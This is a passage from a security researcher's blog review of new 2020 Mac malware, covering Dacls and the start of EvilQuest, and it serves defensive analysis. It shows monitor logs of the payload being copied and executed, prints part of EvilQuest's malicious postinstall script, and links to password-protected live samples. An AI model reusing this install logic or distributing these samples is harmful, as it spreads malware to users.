<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x5F/eqViral.png />
<meta name="twitter:title" content=The&#32;Mac&#32;Malware&#32;of&#32;2020&#32;üëæ />
<meta name="twitter:description" content=a&#32;comprehensive&#32;analysis&#32;of&#32;the&#32;year&#39;s&#32;new&#32;malware />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=The&#32;Mac&#32;Malware&#32;of&#32;2020&#32;üëæ />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x5F/eqViral.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">The Mac Malware of 2020 üëæ</div>
  <div class="blogSubTitle">a comprehensive analysis of the year&#39;s new malware</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / January 1, 2021</div>
  <link rel="shortcut icon" href="../images/logoApple.ico">
<link rel="stylesheet" type="text/css" href="../css/style.css">
<link href="../css/ss-social.css" rel="stylesheet" />
<link href="../css/ss-standard.css" rel="stylesheet" />
<link href="../css/timeline.css" rel="stylesheet" />
<link href="../css/table.css" rel="stylesheet" />
<link href="../css/new.css" rel="stylesheet" />
<script src="../js/analytics.js"></script>
<script src="../js/sweetalert.min.js"></script>
<script src="../js/donationPopup.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
<style type="text/css">
@media print { body { -webkit-print-color-adjust: exact; } }
</style>
<div class="border">
    <code>
    Our research, tools, and writing, are supported by the "Friends of Objective-See":
    <br>
    <center>
      <div style="width:300px;">
      <a href="https://1password.com/?utm_medium=parnter&utm_source=Objective-See&utm_campaign=gp&utm_content=sponsorship" style="text-decoration: none;">
      <img src="../images/friends/1Password.png" width="250px;" style="display:block; margin:auto; padding-top: 20px;"/>
      <div class="logo-title" style="padding-top:0px;">...the world‚Äôs most-loved password manager!</div>
      </a>
      </div>
    <br>
    <div class="logo-link">
      <a href="https://www.smugmug.com/" style="text-decoration: none; border: none;">
        <img src="../images/friends/smugmug.png" height="50px;">
        <div class="logo-title">SmugMug</div>
      </a>
    </div>
    <div class="logo-link">
      <a href="https://guardianapp.com/" style="text-decoration: none; border: none;">
        <img src="../images/friends/guardian.png" height="48px;">
        <div class="logo-title">Guardian Firewall</div>
      </a>
    </div>
    <div class="logo-link">
      <a href="https://www.securemac.com/" style="text-decoration: none; border: none;">
        <img src="../images/friends/securemac.png" height="40px;">
        <div class="logo-title">SecureMac</div>
      </a>
    </div>
    <div class="logo-link">
      <a href="https://apps.apple.com/us/app/iverify/id1466120520" style="text-decoration: none; border: none;">
        <img src="../images/friends/iVerify.png" width="100px;">
        <div class="logo-title">iVerify</div>
      </a>
    </div>
    <div class="logo-link" style="">
      <a href="https://www.haloprivacy.com/" style="text-decoration: none; border: none;">
        <img src="../images/friends/haloprivacy.png" width="100px;">
        <div class="logo-title">Halo Privacy</div>
      </a>
    </div>
    </center> 
    <br>
    <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
  </code>
</div>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>All samples covered in this post are available in our <a href="https://objective-see.com/malware.html">malware collection</a>.</p>
<p>&hellip;just make sure not to infect yourself!!</p>
</div>
<h3 id="-printable">üñ®Ô∏è Printable</h3>
<p>A printable (PDF) version of this report can be downloaded here:</p>
<center>
  <a class="inlineLink" href="../downloads/MacMalware_2020.pdf">The Mac Malware of 2020.pdf</a>
</center>
<h3 id="-background">‚åõ Background</h3>
<p>Goodbye, and good riddance 2020 &hellip;and hello 2021! ü•≥</p>
<p>In recent years, malicious programs targeting macOS have grown in prevalence (and sophistication), perhaps even reaching parity with Microsoft Windows platforms. This is well illustrated in Malwarebytes&rsquo; &ldquo;<a href="https://resources.malwarebytes.com/files/2020/02/2020_State-of-Malware-Report-1.pdf">2020 State of Malware Report</a>&rdquo;:</p>
<blockquote>
"And for the first time ever, Macs outpaced Windows PCs in number of threats detected per endpoint." -Malwarebytes
</blockquote>
<img src="../images/blog/blog_0x4E/malwarebytes.png"  width="85%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Threats per endpoint, Macs vs. Windows (credit: Malwarebytes)</center>

<p>It is important to note these statistics include both adware (and potentially unwanted programs). And the reality is, if a Mac user is infected with malicious code, more than likely it will be adware (vs. a sophisticated nation-state backdoor):</p>
<blockquote>
"The vast majority of threats for macOS in [recent years] were in the AdWare category." -Kaspersky
</blockquote>
<p>However, it is wise not to underestimate the potential impact of adware, upon its victims. The noted security researcher, <a href="https://twitter.com/thomasareed">Thomas Reed</a> articulates this well in writeup titled &ldquo;<a href="https://blog.malwarebytes.com/mac/2020/02/mac-adware-is-more-sophisticated-dangerous-than-traditional-mac-malware/">Mac adware is more sophisticated and dangerous than traditional Mac malware</a>&rdquo;:</p>
<blockquote>
"However, adware and PUPs can actually be far more invasive and dangerous on the Mac than ‚Äúreal‚Äù malware. They can intercept and decrypt all network traffic, create hidden users with static passwords, make insecure changes to system settings, and generally dig their roots deep into the system so that it is incredibly challenging to eradicate completely." -Thomas Reed
</blockquote>
<p>&hellip;now, back to malware! For the fifth year in a row, I&rsquo;ve decided to put together a blog post that aims to comprehensively cover all the new Mac malware that appeared during the course of the year. While the malware may have been reported on before (i.e. by the AV company that discovered them), this blog aims to cumulatively and comprehensively cover all the new Mac malware of 2020 in one place &hellip;yes, with samples of each malware for download, so that you can play along! #SharingIsCaring</p>
<div class="note">
In this blog post, we focus on new Mac malware specimens or new variants that appeared in 2020. Adware and/or malware from previous years, are not covered. 
<p>However at the end of this blog, I&rsquo;ve included a <a href="#-and-all-others">brief section</a> dedicated to these other threats, that includes links to detailed write-ups. </div></p>
<p>For each malicious specimen covered in this post, we&rsquo;ll identify the malware&rsquo;s:</p>
<ul>
<li>
<p><strong>Infection Vector</strong>:
<br>
How it was able to infect macOS systems.</p>
</li>
<li>
<p><strong>Persistence Mechanism</strong>:
<br>
How it installed itself, to ensure it would be automatically restarted on reboot/user login.</p>
</li>
<li>
<p><strong>Features &amp; Goals</strong>:
<br>
What was the purpose of the malware? a backdoor? a cryptocurrency miner? or something more insidious&hellip;</p>
</li>
</ul>
<p>Also, for each malware specimen, I&rsquo;ve added a direct download link in case you want to follow along with our analysis or dig into the malware more!</p>
<div class="border">
<p>I&rsquo;d personally like to thank the following organizations, groups, and researchers for their work, analysis, &amp; assistance! üôèüèª</p>
<ul>
<li>
<p><a href="https://www.virustotal.com/">VirusTotal</a>.</p>
</li>
<li>
<p><a href="https://twitter.com/thomasareed">@thomasareed</a>, <a href="https://twitter.com/Morpheus______">@morpheus______</a>, <a href="https://twitter.com/philofishal">@philofishal</a>, and others who choose to remain unnamed.</p>
</li>
</ul>
</div>
<br>
<h3 id="-malware-analysis-tools-amp-tactics">üõ†Ô∏è Malware Analysis Tools &amp; Tactics</h3>
<p>Throughout this blog, we&rsquo;ll reference various tools used in analyzing the malware specimens.</p>
<p>These include:</p>
<ul>
<li>
<p><a href="https://objective-see.com/products/utilities.html#ProcessMonitor"><code>ProcessMonitor</code></a>
<br>
Our user-mode (<a href="https://github.com/objective-see/ProcessMonitor">open-source</a>) utility that monitors process creations and terminations, providing detailed information about such events.</p>
</li>
<li>
<p><a href="https://objective-see.com/products/utilities.html#FileMonitor"><code>FileMonitor</code></a>
<br>
Our user-mode (<a href="https://github.com/objective-see/FileMonitor">open-source</a>) utility monitors file events (such as creation, modifications, and deletions) providing detailed information about such events.</p>
</li>
<li>
<p><a href="https://objective-see.com/products/whatsyoursign.html"><code>WhatsYourSign</code></a>
<br>
Our (<a href="https://github.com/objective-see/WhatsYourSign">open-source</a>) utility that displays code-signing information, via the UI.</p>
</li>
<li>
<p><a href="https://objective-see.com/products/netiquette.html"><code>Netiquette</code></a>
<br>
Our (<a href="https://github.com/objective-see/Netiquette">open-source</a>) network monitor.</p>
</li>
<li>
<p><code>lldb</code>
<br>
The de-facto commandline debugger for macOS. Installed (to <code>/usr/bin/lldb</code>) as part of Xcode.</p>
</li>
<li>
<p><a href="https://www.hopperapp.com/"><code>Hopper Disassembler</code></a>
<br>
A &ldquo;reverse engineering tool (for macOS) that lets you disassemble, decompile and debug your applications&rdquo; &hellip;or malware specimens!</p>
</li>
</ul>
<div class="note">
üìö Interested in general Mac malware analysis techniques?
<br>
...you're in luck, as I've written an entire (free) book on this very topic:
<br><br>
<center>
  <a class="inlineLink" href="https://taomm.org">The Art Of Mac Malware, Vol. 0x1: Analysis</a>
</center>
</div>
<br>
<br>
<h3 id="-timeline">üóìÔ∏è Timeline</h3>
<ul class="timeline">
    <li>
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x53/backdoor.png" width="32" style="padding-top: 8px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-osxdacls">Dacls</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>05/2020</code>
          <br />
          <br />
          A macOS port of a Lazarus group cross-platform backdoor.
        </div>
      </div>
    </li>
    <li class="timeline-inverted">
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/virus.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-osxevilquest">EvilQuest</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>06/2020</code>
          <br />
          <br />
          A insidious virus, will ransomware capabilities.
        </div>
      </div>
    </li>
    <li>
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x53/backdoor.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <h4 class="timeline-title"><a class="inlineLink" href="#-osxwatchcat">WatchCat</a></h4>
        </div>
        <div class="timeline-body">
          <code>07/2020</code>
          <br />
          <br />
          The latest Lazarus APT group backdoor.
        </div>
      </div>
    </li>
    <li class="timeline-inverted">
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/spy.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <h4 class="timeline-title">
            <a class="inlineLink" href="#-osxxcsset">XCSSET</a></h4>
        </div>
        <div class="timeline-body">
          <code>08/2020</code>
          <br />
          <br />
          Targeting developers this malware leverages various 0days to steal passwords and exfiltrate data.
        </div>
      </div>
    </li>
    <li>
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/spy.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <h4 class="timeline-title">
            <a class="inlineLink" href="#-osxfinspy">FinSpy</a></h4>
        </div>
        <div class="timeline-body">
          <code>09/2020</code>
          <br />
          <br />
          A commercial cross-platform implant, supporting a myriad of cyber espionage features &amp; capabilities. 
        </div>
      </div>
    </li>
    <li class="timeline-inverted">
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/botnet.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <h4 class="timeline-title"><a class="inlineLink" href="#-ipstorm">IPStorm</a></h4>
          </div>
        <div class="timeline-body">
          <code>10/2019</code>
          <br />
          <br />
          A cross platform botnet, ...now ported to macOS.
        </div>
      </div>
    </li>
    <li>
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/downloader.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <h4 class="timeline-title"><a class="inlineLink" href="#-gravityrat">GravityRAT</a></h4>
        </div>
        <div class="timeline-body">
          <code>11/2019</code>
          <br />
          <br />
          A cross-platform first-stage downloader for a RAT, ...now ported to macOS.
        </div>
      </div>
    </li>
</ul>
<br>
<h3 id="-osxdacls">üëæ <code>OSX.Dacls</code></h3>
<div class="note">
<p>Dacls is a macOS port of the cross-platform Dacls RAT (created by the Lazarus APT group), which affords a remote attacker complete control over an infected system.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://objective-see.com/downloads/malware/Dacls.zip"><code>OSX.Dacls</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>Dacls originally was discovered in 2019, but at that time was only seen targeting Windows and Linux systems:</p>
<blockquote>
"Dacls is a RAT that was discovered by Qihoo 360 NetLab in December 2019 as a fully functional covert remote access Trojan targeting the Windows and Linux platforms." -Malwarebytes
</blockquote>
<p>&hellip;in 2020, MalwareBytes uncovered a macOS variant.
<br>
<br></p>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li><a href="https://objective-see.com/blog/blog_0x57.html">&ldquo;The Dacls RAT &hellip;now on macOS!&rdquo;</a></li>
<li><a href="https://blog.malwarebytes.com/threat-analysis/2020/05/new-mac-variant-of-lazarus-dacls-rat-distributed-via-trojanized-2fa-app/">&ldquo;New Mac variant of Lazarus Dacls RAT distributed via Trojanized 2FA app&rdquo;</a></li>
</ul>
<p><br>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Trojanized (2FA) Application</span></p></p>
<p>MalwareBytes, who uncovered the Mac variant of <code>OSX.Dacls</code>, note:</p>
<blockquote>
"[the] Mac version is ...distributed via a Trojanized two-factor authentication application for macOS called MinaOTP"
</blockquote>
<p>The trojanized application was (re)named <code>TinkaOTP</code>, and distributed via disk image <code>TinkaOTP.dmg</code></p>
<p>&hellip;it is likely that the attackers relied on social engineering efforts, having to coerce macOS users to download and run trojanized application. This is the de-factor infection mechanism leveraged by Lazarus group for many years (to target macOS users).</p>
<p>For example back in 2018, after creating a fake crypto-currency site, they emailed users with links to download <code>OSX.AppleJeus</code>:</p>
<img src="../images/blog/blog_0x49/rsa.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.AppleJeus infection vector</center>

<p>The application, <code>TinkaOTP.app</code> is signed &ldquo;adhoc-ly&rdquo; (as the Lazarus group often does):
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ codesign -dvvv /Volumes/TinkaOTP/TinkaOTP.app 

Executable=/Volumes/TinkaOTP/TinkaOTP.app/Contents/MacOS/TinkaOTP
Identifier=com.TinkaOTP
Format=app bundle with Mach-O thin (x86_64)
...
<b>Signature=adhoc</b>
</pre>
</div></p>
<p>This also means that on modern versions of macOS (unless some exploit is first used to gain code execution on the target system), the application will not (easily) run:</p>
<img src="../images/blog/blog_0x57/damaged.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">macOS blocking TinkaOTP.app</center>

<p>Let&rsquo;s now take a closer look at the application bundle of <code>TinkaOTP.app</code>:</p>
<img src="../images/blog/blog_0x57/appBundle.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">TinkaOTP Application Bundle</center>

<p>If the user runs the (trojanized) application, infection will commence. Specifically, <code>/Contents/MacOS/TinkaOTP</code> binary will copy a file from within its application bundle (<code>Resources/Base.lproj/SubMenu.nib</code>), to <code>~/Library/.mina</code> and then executing it.</p>
<p>This can be passively observed via our <a href="https://objective-see.com/products/utilities.html#ProcessMonitor"><code>ProcessMonitor</code></a>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "pid" : 864
    "path" : "/bin/cp",
    "arguments" : [
      "cp",
      "/Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib",
      "/Users/user/Library/.mina"
    ]
    ...
  }
}

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "pid" : 866
    "path" : "/Users/user/Library/.mina",
    "arguments" : [
      "/Users/user/Library/.mina"
    ]
    ...
  }
}
</pre>
</div>
<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Item</span>
</p>
<p><code>OSX.Dacls</code> persists as a launch item (<code>com.aex.lop.agent.plist</code>).
<br>
If running as root, it will persists as a launch daemon, otherwise, as a user launch agent.</p>
<p>The binary <code>SubMenu.nib</code> (which recall, was copied to <code>~/Library/.mina</code>) contains both a template for, and path to, the persistent launch item property list:</p>
<img src="../images/blog/blog_0x57/plist.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.Dacl&#39;s launch item template</center>

<br>
<img src="../images/blog/blog_0x57/launchAgent.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.Dacl&#39;s launch item path</center>

<p>Via our  <a href="https://objective-see.com/products/utilities.html#FileMonitor"><code>FileMonitor</code></a>, one can passively observe the malware creating the launch item (here a user launch agent, <code>~/Library/LaunchAgents/com.aex-loop.agent.plist</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor/Contents/MacOS/FileMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    <b>"destination" : "/Users/user/Library/LaunchAgents/com.aex-loop.agent.plist"</b>,
    "process" : {  
      "path" : "/Users/user/Library/.mina",
      "pid" : 931
      ...
    }
  }
}
</pre>
</div>
<p>As the value for the <code>RunAtLoad</code> key in <code>com.aex-loop.agent.plist</code> is set to true, the malware will be automatically (re)started by macOS each time the system is rebooted (and the user logs in).</p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Persistent Backdoor (+ plugins).
</span>
</p>
<p>We noted that <code>OSX.Dacls</code> is a macOS port of a Windows/Linux RAT. The initial report on the (Windows/Linux versions of the) Dacls RAT, was published in December 2019, by Netlab. Titled, &ldquo;<a href="https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/">Dacls, the Dual platform RAT</a>&rdquo;. In terms of the RATs capabilities, the report noted it utilizes a modular plugin architecture:</p>
<blockquote>
"[Dacls] uses static compilation to compile the plug-in and Bot code together. By sending different instructions to call different plug-ins, various tasks can be completed.
<p>The main functions of &hellip;Dacls Bot include: command execution, file management, process management, test network access, C2 connection agent, network scanning module.&quot; -Netlab</p>
</blockquote>
<p>The report describes various plugins such as a:</p>
<ul>
<li>File plugin</li>
<li>Process plugin</li>
<li>&ldquo;Test&rdquo; plugin</li>
<li>&ldquo;Reverse P2P&rdquo; plugin</li>
<li>&ldquo;LogSend&rdquo; plugin</li>
</ul>
<p>Analyzing the malware&rsquo;s disassembly (specifically searching for <code>LoadPlugin_</code>* functions), we can see that the macOS variant of Dacls supports these same plugins (plus several others, such as SOCKS plugin):</p>
<img src="../images/blog/blog_0x57/plugins.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.Dacl&#39;s Plugins</center>

<p>Via these plugins a remote attackers can interact with and fully control an infected system by:</p>
<ul>
<li>Executing system commands</li>
<li>Process actions, such as listing, creating, &amp; terminating</li>
<li>File action such as upload/download, read/write, &amp; deleting</li>
<li>&hellip;and more (such as performing network scans).</li>
</ul>
<div class="note">
<p>For more details on the plugins and their implementation, see Netlab&rsquo;s report:</p>
<center>
  "<a href="https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/" class="inlineLink">Dacls, the Dual platform RAT</a>"
</center>
</div>
<br>
<br>
<h3 id="-osxevilquest">üëæ <code>OSX.EvilQuest</code></h3>
<div class="note">
<p>EvilQuest (also known as ThiefQuest) is a (true) computer virus, that also provides remote tasking and ransomware logic.</p>
 <p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://objective-see.com/downloads/malware/EvilQuest.zip"><code>OSX.EvilQuest</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>The noted Malware researcher <a href="https://twitter.com/dineshdina04">Dinesh Devadoss</a> discovered <code>OSX.EvilQuest</code> and tweeted about its ransomware tendencies and impersonation as Google Software update:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/macOS?src=hash&amp;ref_src=twsrc%5Etfw">#macOS</a> <a href="https://twitter.com/hashtag/ransomware?src=hash&amp;ref_src=twsrc%5Etfw">#ransomware</a> impersonating as Google Software Update program with zero detection. <br><br>MD5: <br>522962021E383C44AFBD0BC788CF6DA3 6D1A07F57DA74F474B050228C6422790 98638D7CD7FE750B6EAB5B46FF102ABD<a href="https://twitter.com/philofishal?ref_src=twsrc%5Etfw">@philofishal</a> <a href="https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw">@patrickwardle</a> <a href="https://twitter.com/thomasareed?ref_src=twsrc%5Etfw">@thomasareed</a> <a href="https://t.co/r5tkmfzmFT">pic.twitter.com/r5tkmfzmFT</a></p>&mdash; Dinesh_Devadoss (@dineshdina04) <a href="https://twitter.com/dineshdina04/status/1277668001538433025?ref_src=twsrc%5Etfw">June 29, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>Further analysis uncovered other insidious capabilities, including the ability to virally infected other binaries on an infected system!</p>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p><a href="https://objective-see.com/blog/blog_0x59.html">&ldquo;OSX.EvilQuest Uncovered (Part 1)&rdquo;</a></p>
</li>
<li>
<p><a href="https://objective-see.com/blog/blog_0x60.html">&ldquo;OSX.EvilQuest Uncovered (Part 2)&rdquo;</a></p>
</li>
<li>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/updates-on-thiefquest-the-quickly-evolving-macos-malware/?utm_source=feedburner">&ldquo;Updates on ThiefQuest, the Quickly-Evolving macOS Malware&rdquo;</a></p>
</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Pirated Software</span></p>
<p>From Dinesh&rsquo;s <a href="https://twitter.com/dineshdina04/status/1277668001538433025">tweet</a>, it was not apparent how the malware was able to infect macOS users. However, <a href="https://twitter.com/thomasareed?lang=en">Thomas Reed</a> of Malwarebytes, noted that the malware had (also?) been found in pirated versions of popular macOS software, shared on popular torrent sites:</p>
<img src="../images/blog/blog_0x5F/eqInfectionVector.png"  width="80%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Pirated Application, Infected with OSX.EvilQuest (credit: Malwarebytes)</center>

<br>
<div class="note">
Ethical reasons aside, it's generally unwise to install pirated software, as it is often infected with malware. 
<p>&ldquo;Torrent sites are notorious for distributing malware and adware, sometimes through misleading advertisements, and sometimes through Trojan horse downloads that claim to be &lsquo;cracks&rsquo; or that may contain infected copies of legitimate software&rdquo; -Intego</p>
</div>
<p>The sample analyzed here, was packaged in a pirated version of the popular DJ software <a href="https://mixedinkey.com/">Mixed In Key</a>. The malicious package was unsigned &hellip;meaning macOS will prompt the user before allowing it to be opened:</p>
<img src="../images/blog/blog_0x5F/eqPackage.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.EvilQuest Infection Vector</center>

<p>However, macOS users attempting to pirate software will likely ignore this warning, pressing onwards &hellip;ensuring infection commences.</p>
<p>We can use the <a href="https://mothersruin.com/software/SuspiciousPackage/"><code>Suspicious Package</code></a> utility to statically examine the package contetns. It contains an application named <code>Mixed In Key 8</code> and binary named &ldquo;<code>patch</code>&rdquo;:</p>
<img src="../images/blog/blog_0x59/files.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Clicking on the &ldquo;All Scripts&rdquo; tab, we find also find a post install script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span>mkdir /Library/mixednkey
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>mv /Applications/Utils/patch /Library/mixednkey/toolroomd
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>rmdir /Application/Utils
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>
